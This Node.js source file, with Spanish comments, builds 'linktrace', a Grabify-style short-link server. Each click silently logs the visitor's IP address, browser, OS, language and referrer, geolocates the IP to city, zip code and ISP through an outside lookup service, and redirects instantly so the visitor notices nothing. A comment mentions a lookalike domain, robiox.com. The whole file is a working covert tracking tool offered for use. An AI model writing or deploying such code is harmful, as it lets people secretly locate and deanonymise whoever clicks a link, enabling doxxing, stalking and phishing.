/* linktrace — rastreador de enlaces tipo grabify (Node puro) */
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
// Dominio que verán los links. Cámbialo por el tuyo si no controlas robiox.com.
const BASE = (process.env.BASE_URL || 'https://folk-project.onrender.com').replace(/\/+$/, '');
const DATA_FILE = path.join(__dirname, 'data.json');

let db = { links: {} };
try { db = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (_) {}
const save = () => fs.writeFileSync(DATA_FILE, JSON.stringify(db, null, 2));

function newCode(n = 6) {
  const a = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let s = ''; for (let i = 0; i < n; i++) s += a[crypto.randomInt(a.length)];
  return s;
}
const linkURL = c => BASE + '/' + c;

const json = (res, o, s = 200) => {
  res.writeHead(s, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(JSON.stringify(o));
};
const readBody = req => new Promise(r => { let b = ''; req.on('data', c => b += c); req.on('end', () => r(b)); });

function clientIP(req) {
  const xff = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
  let ip = xff || req.socket.remoteAddress || '';
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  return ip;
}
const isPrivate = ip => !ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('10.') ||
  ip.startsWith('192.168.') || /^172\.(1[6-9]|2\d|3[01])\./.test(ip);

async function geoLookup(ip) {
  if (isPrivate(ip)) return null;
  try {
    const r = await fetch('http://ip-api.com/json/' + encodeURIComponent(ip) +
      '?fields=status,country,countryCode,regionName,city,zip,isp,org,as,timezone');
    const j = await r.json();
    if (j.status !== 'success') return null;
    return { country: j.country, cc: j.countryCode, region: j.regionName, city: j.city,
             zip: j.zip, isp: j.isp, org: j.org, asn: j.as, timezone: j.timezone };
  } catch (_) { return null; }
}

function parseUA(ua) {
  const o = { browser: 'Desconocido', os: 'Desconocido', device: 'Escritorio' };
  if (/Edg\//.test(ua)) o.browser = 'Edge';
  else if (/OPR\/|Opera/.test(ua)) o.browser = 'Opera';
  else if (/Firefox\//.test(ua)) o.browser = 'Firefox';
  else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) o.browser = 'Chrome';
  else if (/Safari\//.test(ua) && /Version\//.test(ua)) o.browser = 'Safari';
  if (/Windows NT 10/.test(ua)) o.os = 'Windows 10/11';
  else if (/Windows/.test(ua)) o.os = 'Windows';
  else if (/Android/.test(ua)) o.os = 'Android';
  else if (/iPhone|iPad|iPod/.test(ua)) o.os = 'iOS';
  else if (/Mac OS X/.test(ua)) o.os = 'macOS';
  else if (/Linux/.test(ua)) o.os = 'Linux';
  if (/iPad|Tablet/.test(ua)) o.device = 'Tablet';
  else if (/Mobile|Android|iPhone/.test(ua)) o.device = 'Móvil';
  return o;
}

function serveIndex(res) {
  fs.readFile(path.join(__dirname, 'index.html'), (e, buf) => {
    if (e) { res.writeHead(200, { 'Content-Type': 'text/html' }); return res.end('<h1>linktrace</h1>'); }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    res.end(buf);
  });
}

const server = http.createServer(async (req, res) => {
  const p = new URL(req.url, 'http://' + (req.headers.host || 'localhost')).pathname;

  if (p === '/' || p === '/index.html') return serveIndex(res);
  if (p === '/favicon.ico') { res.writeHead(204); return res.end(); }
  if (p === '/api/config') return json(res, { base: BASE });

  if (p === '/api/links') {
    if (req.method === 'GET') {
      return json(res, Object.values(db.links).sort((a, b) => b.created - a.created).map(l => ({
        code: l.code, dest: l.dest, label: l.label, created: l.created, clicks: l.visits.length, url: linkURL(l.code)
      })));
    }
    if (req.method === 'POST') {
      let o = {}; try { o = JSON.parse(await readBody(req) || '{}'); } catch (_) {}
      let dest = String(o.dest || '').trim();
      if (!dest) return json(res, { error: 'Escribe un destino' }, 400);
      if (!/^https?:\/\//i.test(dest)) dest = 'https://' + dest;
      const c = newCode();
      db.links[c] = { code: c, dest, label: String(o.label || '').trim(), created: Date.now(), visits: [] };
      save();
      return json(res, { ok: true, code: c, url: linkURL(c) });
    }
  }

  if (p.startsWith('/api/links/')) {
    const c = decodeURIComponent(p.slice('/api/links/'.length));
    const l = db.links[c];
    if (!l) return json(res, { error: 'No existe' }, 404);
    if (req.method === 'GET') return json(res, { ...l, url: linkURL(c) });
    if (req.method === 'DELETE') { delete db.links[c]; save(); return json(res, { ok: true }); }
  }

  // --- cualquier otra ruta = link rastreador ---
  const c = decodeURIComponent(p.replace(/^\/+/, ''));
  const l = db.links[c];
  if (!l) { res.writeHead(302, { Location: '/' }); return res.end(); }

  const ip = clientIP(req);
  const ua = req.headers['user-agent'] || '';
  const v = {
    ip, time: Date.now(), ua,
    lang: req.headers['accept-language'] || '',
    ref: req.headers['referer'] || req.headers['referrer'] || '',
    ...parseUA(ua)
  };
  l.visits.unshift(v);
  if (l.visits.length > 1000) l.visits.length = 1000;
  save();

  geoLookup(ip).then(g => { if (g) { v.geo = g; save(); } });

  // redirección instantánea, sin interfaz
  res.writeHead(302, { Location: l.dest, 'Cache-Control': 'no-store, max-age=0' });
  res.end();
});

server.listen(PORT, () => console.log('linktrace en http://localhost:' + PORT + '  (base: ' + BASE + ')')); 
